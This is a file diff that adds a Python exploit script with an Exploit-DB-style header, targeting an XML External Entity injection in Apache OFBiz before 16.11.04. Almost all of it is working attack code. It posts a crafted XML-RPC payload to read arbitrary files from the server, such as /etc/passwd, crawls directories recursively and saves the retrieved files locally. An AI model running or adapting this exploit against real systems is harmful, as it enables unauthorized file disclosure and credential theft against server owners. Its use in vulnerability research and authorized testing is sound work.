@@ -1,0 +1,125 @@
+# Exploit Title: Apache OFBiz 16.11.04 - XML External Entity Injection
+# Date: 2018-10-15
+# Exploit Author: Jamie Parfet
+# Vendor Homepage: https://ofbiz.apache.org/
+# Software Link: https://archive.apache.org/dist/ofbiz/
+# Version: < 16.11.04
+# Tested on: Ubuntu 18.04.1
+# CVE: N/A
+
+#!/usr/bin/env python3
+# *****************************************************
+# Type: XML External Entity Injection (File disclosure)
+# Target: Apache OFBiz < 16.11.04
+# Author: Jamie Parfet
+# *****************************************************
+import sys
+import os
+import requests
+import urllib3
+import re
+import argparse
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+simple_payload = """<?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://{}">]>
+<methodCall><methodName>xXx
+&disclose;xXx</methodName></methodCall>
+"""
+
+if len(sys.argv) <= 1:
+    print('[*] Apache OFBiz < 16.11.04 XXE')
+    print('[*] Use "%s -h" to display help.' % (sys.argv[0]))
+    exit(0)
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u",
+                    metavar="https://localhost:8443",
+                    dest="url",
+                    required=True,
+                    help="Target URL (required)",
+                    action='store')
+parser.add_argument("-f",
+                    metavar="/etc/passwd",
+                    dest="file",
+                    help="Target file",
+                    action='store')
+parser.add_argument("-c",
+                    metavar="/home/",
+                    dest="crawl",
+                    help="Target directory to start crawling from",
+                    action='store')
+parser.add_argument("-o",
+                    metavar="~/local/output/directory/",
+                    dest="output_dir",
+                    help="Local directory that remote file will be saved to",
+                    action='store')
+args = parser.parse_args()
+url = args.url if args.url else None
+target_file = args.file if args.file else None
+crawl_dir = args.crawl if args.crawl else None
+output_dir = args.output_dir if args.output_dir else None
+
+
+def check_url(url):
+    if '://' not in url:
+        print('[-] ERROR: Please include protocol in URL, such as https://{}'.format(url))
+        exit(0)
+    else:
+        return url
+
+
+def request(url, payload):
+    response = requests.post(url + '/webtools/control/xmlrpc', data=payload, verify=False).text
+    parsed_response = re.sub(r'(.*xXx\n|xXx.*)', '', response)
+    return parsed_response
+
+
+def crawl(crawl_dir):
+    payload = simple_payload.format(crawl_dir)
+    response = request(url, payload)
+    payload_404 = simple_payload.format(crawl_dir + "/xX404Xx")
+    response_404 = request(url, payload_404)
+    if 'No such file or directory' in response:
+        print("[-] ERROR - 404: {}".format(crawl_dir))
+    elif 'Permission denied' in response or 'but is not accessible' in response:
+        print("[-] ERROR - Permission: {}".format(crawl_dir))
+    elif 'Not a directory' in response_404:
+        print("[*] FILE: {}".format(crawl_dir))
+    else:
+        print("[*] DIR: {}".format(crawl_dir))
+        for f in response.splitlines():
+            full_path = (crawl_dir + '/' + f)
+            crawl(full_path)
+
+
+def main(url=url, target_file=target_file, crawl_dir=crawl_dir, output_dir=output_dir):
+    if url:
+        check_url(url)
+        if crawl_dir:
+            crawl(crawl_dir)
+        else:
+            payload = simple_payload.format(target_file)
+            if output_dir:
+                if os.path.isdir(output_dir):
+                    result = request(url, payload)
+                    remote_file_name = re.sub('/', '--', target_file)
+                    output_file = (output_dir + '/' + remote_file_name[2:])
+                    file = open(output_file, 'w')
+                    file.write(result)
+                    file.close()
+                else:
+                    print("[-] ERROR: {} is not a writeable directory".format(output_dir))
+            else:
+                result = request(url, payload)
+                print(result)
+
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print('\nKeyboard interrupt detected.')
+        print('Exiting...')
+        exit(0)
